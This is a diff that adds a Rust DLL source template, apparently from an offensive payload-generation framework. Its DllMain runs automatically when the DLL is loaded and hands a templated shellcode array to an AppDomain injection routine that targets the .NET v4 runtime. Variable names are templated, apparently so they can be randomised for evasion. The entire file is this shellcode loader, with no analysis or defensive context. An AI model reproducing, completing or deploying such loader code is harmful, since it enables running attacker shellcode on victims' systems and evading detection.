@@ -1,0 +1,21 @@
+extern crate scaffold;
+
+#[no_mangle]
+pub unsafe extern "system" fn DllMain(
+    _: *mut core::ffi::c_void, reason: u32, _: *mut core::ffi::c_void,
+) -> i32 {
+    if reason == 1 {
+        let {{ v.var_key }}_v: &[u16] = &[118u16, 52u16, 46u16, 48u16, 46u16, 51u16, 48u16, 51u16, 49u16, 57u16, 0u16];
+        let {{ v.var_shellcode }}: &[u8] = &[
+            {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
+        ];
+        scaffold::inject::appdomain::load_assembly_appdomain(
+            {{ v.var_key }}_v,
+            {{ v.var_shellcode }},
+            &[0u16],
+            &[0u16],
+            &[0u16],
+        );
+    }
+    1
+}
